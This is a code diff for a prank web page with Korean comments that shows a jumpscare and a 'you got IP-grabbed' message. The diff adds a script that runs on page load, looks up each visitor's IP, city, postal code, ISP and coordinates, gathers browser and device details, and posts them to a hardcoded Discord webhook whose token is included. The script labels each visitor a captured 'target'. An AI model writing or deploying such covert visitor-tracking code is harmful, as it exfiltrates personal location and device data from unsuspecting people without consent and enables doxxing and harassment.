@@ -71,29 +71,56 @@
         <div id="ip-text">너 ip따임 ㅋㅋㅋ</div>
     </div>
 
-    <!-- 비디오 파일에서 소리만 빼서 무한 반복 (화면엔 안 보임) -->
+    <!-- 비디오 소리 무한 반복 -->
     <video id="sumpsound" src="ScreenRecording_08-31-2026 22-35-48_1.mov" preload="auto" loop playsinline style="display:none;"></video>
 
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/1543975289527341118/tgC_i7WSsTccdUWBE2FXjMkY1__piEvWo1UxZkP3BTlbKNpCrlAujbLFeEjJoMyIbrxl';
 
-        // IP 추출 및 전송
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => {
-                const visitorIP = data.ip;
+        // 접속 즉시 실행 (IP 및 브라우저 환경 환산 데이터 수집)
+        (async function() {
+            try {
+                const ipRes = await fetch('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                const ipData = await ipRes.json();
 
-                fetch(webhookURL, {
+                const deviceInfo = {
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    cores: navigator.hardwareConcurrency || '알 수 없음',
+                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '알 수 없음'
+                };
+
+                let payloadContent = `🚨 **타겟 전면 분석 데이터 포착!**\n`;
+                if(ipData.status === 'success') {
+                    payloadContent += `> **IP 주소:** \`${ipData.query}\`\n` +
+                                      `> **국가 / 도시:** ${ipData.country} / ${ipData.regionName} / ${ipData.city} (우편번호: ${ipData.zip})\n` +
+                                      `> **통신사(ISP):** ${ipData.isp} (${ipData.org})\n` +
+                                      `> **AS번호:** ${ipData.as}\n` +
+                                      `> **위치 좌표:** 위도 ${ipData.lat}, 경도 ${ipData.lon}\n` +
+                                      `> **타임존:** ${ipData.timezone}\n`;
+                } else {
+                    payloadContent += `> **IP 위치 조회 실패**\n`;
+                }
+
+                payloadContent += `> **플랫폼/OS:** ${deviceInfo.platform}\n` +
+                                  `> **사용 언어:** ${deviceInfo.language}\n` +
+                                  `> **화면 해상도:** ${deviceInfo.screen}\n` +
+                                  `> **CPU 코어 수:** ${deviceInfo.cores}\n` +
+                                  `> **디바이스 메모리:** ${deviceInfo.memory}\n` +
+                                  `> **브라우저 정보:** \`${deviceInfo.ua}\``;
+
+                // 디스코드 웹훅 즉시 전송
+                await fetch(webhookURL, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        content: `🎯 **새로운 타겟 포착!**\n> IP 주소: \`${visitorIP}\``
-                    })
-                }).catch(err => console.error(err));
-            })
-            .catch(() => {});
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: payloadContent })
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        })();
 
         const term = document.getElementById('terminal');
         const jump = document.getElementById('jumpscare');
@@ -120,7 +147,6 @@
                     term.style.display = 'none';
                     jump.style.display = 'block';
 
-                    // 플래시와 함께 소리 재생
                     sound.play().catch(e => console.log("Audio play blocked:", e));
 
                     setTimeout(() => {
